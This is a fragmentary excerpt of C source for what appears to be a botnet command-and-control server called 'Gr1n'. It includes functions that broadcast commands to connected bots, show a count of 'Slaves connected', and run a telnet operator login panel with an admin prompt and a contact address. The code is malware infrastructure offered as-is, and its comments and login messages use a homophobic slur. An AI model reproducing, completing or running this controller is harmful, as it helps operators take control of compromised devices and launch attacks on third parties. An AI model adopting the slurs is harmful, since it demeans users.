...
void broadcast(char *msg, int us) // sends message to all bots, notifies the management clients of this happening
{
        ...
        for(i = 0; i < MAXFDS; i++)
        {
                ...
                send(i, "\r\n", 2, MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "[Admin@Gr1n ~]# ", 15, MSG_NOSIGNAL); // Send a new line to them faggots
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
...
void *titleWriter(void *sock) // Information in the window title ya know
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Slaves connected: %d | Clients: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock, void *telnetListener)
{
        ...
        if(send(thefd, "\x1b[32m*            USERNAME                  *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\x1b[32m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m*          INVALID CREDENTIALS         *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m*        You Have Been Logged Faggot       *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
        fak:
        ...
        if(send(thefd, "*          \x1b[32mWELCOME TO THE GR1N\x1b[36m        *\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*           \x1b[32m\x1b[32mFollow Admin@Gr1n1337\x1b[32m\x1b[32m        *\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*       \x1b[32m\x1b[32mContact 6r1n@protonmail.ch\x1b[32m\x1b[32m   *\r\n", 74, MSG_NOSIGNAL) == -1) goto end;
       ...
       if(send(thefd, "\r\n[Admin@Gr1n ~]# ", 17, MSG_NOSIGNAL) == -1) goto end;
	   ...
	   if(strstr(buf, "!* Slaves")) 
	   {  
		  sprintf(botnet, "Slaves connected: %d | Clients: %d\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
       }
                trim(buf);
                if(send(thefd, "[Admin@Gr1n ~]# ", 15, MSG_NOSIGNAL) == -1) goto end;
